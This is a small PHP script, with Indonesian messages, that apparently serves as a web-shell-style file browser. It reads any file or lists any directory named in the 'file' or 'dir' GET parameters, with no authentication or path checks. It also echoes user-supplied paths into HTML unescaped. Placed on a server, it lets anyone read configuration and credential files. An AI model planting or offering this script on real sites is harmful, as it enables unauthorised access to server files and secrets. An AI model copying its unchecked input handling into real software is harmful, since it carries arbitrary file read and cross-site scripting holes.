<?php

#file
if(isset($_GET["file"])){
    $file = urldecode($_GET["file"]);
    if(file_exists($file)){
        echo "<textarea style='width: 100%;  height: 100%'>".htmlspecialchars(file_get_contents($file))."</textarea>";
    }else{
        echo $file." tidak ditemukan";
    }
}

#dir
elseif (isset($_GET["dir"])) {
    $dir = urldecode($_GET["dir"]);
    if(file_exists($dir)){
        $files = glob("$dir/*");
        foreach ($files as $file){
            if(is_dir($file)){
                echo "<a href='?dir=$file'>$file</a><br>\n";
            }else{
                echo "<a href='?file=$file'>$file</a><br>\n";
            }
        }
    }else{
        echo $dir." tidak ditemukan";
    }
}

else{
    $files = glob("*");
    foreach ($files as $file){
        if(is_dir($file)){
            echo "<a href='?dir=$file'>$file</a><br>\n";
        }else{
            echo "<a href='?file=$file'>$file</a><br>\n";
        }
        
    }
}